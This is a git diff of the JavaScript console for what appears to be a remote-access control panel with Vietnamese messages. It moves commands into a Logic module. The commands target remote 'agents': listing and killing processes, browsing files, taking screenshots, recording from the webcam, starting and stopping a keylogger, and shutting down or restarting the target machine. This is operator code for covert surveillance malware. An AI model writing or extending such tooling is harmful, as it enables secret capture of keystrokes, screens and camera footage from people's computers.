@@ -1,6 +1,7 @@
 import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
 import { GatewayDiscovery } from './modules/discovery.js';
+import * as Logic from './logic.js';
 
 const appState = {
     isConnected: false,
@@ -295,7 +296,7 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 window.getAgentList = () => {
-    gateway.refreshAgents();
+    Logic.getAgentList();
 }
 
 window.auth = () => {
@@ -303,7 +304,7 @@ window.auth = () => {
         ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
         return;
     }
-    gateway.authenticate();
+    Logic.authenticate();
 };
 
 const discovery = new GatewayDiscovery();
@@ -331,49 +332,55 @@ window.reconnect = () => {
 
 window.setTarget = (agentId) => {
     appState.currentTarget = agentId;
-    gateway.setTarget(agentId);
+    Logic.setTarget(agentId);
     ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
 }
 
-window.listApps = () => gateway.fetchAppList();
-window.startApp = (id) => gateway.startApp(id);
-window.stopApp = (id) => gateway.killApp(id);
+window.listApps = () => Logic.fetchAppList();
+window.startApp = (id) => Logic.startApp(id);
+window.stopApp = (id) => Logic.stopApp(id);
 
-window.listProcs = () => gateway.fetchProcessList();
-window.startProc = (id) => gateway.startProcess(id);
-window.stopProc = (id) => gateway.killProcess(id);
+window.listProcs = () => Logic.fetchProcessList();
+window.startProc = (id) => Logic.startProcess(id);
+window.stopProc = (id) => Logic.killProcess(id);
 
 window.listFiles = (path = "") => {
     if (path === "") {
         path = "/";
     }
     ui.info(`[CMD] Listing files in: ${path}`);
-    gateway.listFiles(path);
+    Logic.listFiles(path);
 };
 
-window.whoami = () => gateway.send(CONFIG.CMD.WHOAMI, "");
-window.echo = (text) => gateway.send(CONFIG.CMD.ECHO, text);
-window.screenshot = () => gateway.send(CONFIG.CMD.SCREENSHOT, "");
-window.recordCam = (duration = 5) => gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));
+window.whoami = () => Logic.whoami();
+window.echo = (text) => Logic.echo(text);
+window.screenshot = () => {
+    ui.info("[CMD] Chụp màn hình...");
+    Logic.captureScreen();
+};
+window.recordCam = (duration = 5) => {
+    ui.info(`[CMD] Quay webcam ${duration} giây...`);
+    Logic.recordWebcam(duration);
+};
 
 window.startKeylog = () => {
     ui.info("[CMD] Bật Keylogger...");
-    gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({interval: 0.5}));
+    Logic.startKeylog(0.5);
 };
 window.stopKeylog = () => {
     ui.info("[CMD] Tắt Keylogger...");
-    gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
+    Logic.stopKeylog();
 };
 
 window.shutdownAgent = () => {
     if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
-        gateway.send(CONFIG.CMD.SHUTDOWN, "");
+        Logic.shutdownAgent();
     }
 }
 
 window.restartAgent = () => {
     if (confirm("RESTART?")) {
-        gateway.send(CONFIG.CMD.RESTART, "");
+        Logic.restartAgent();
     }
 }
 
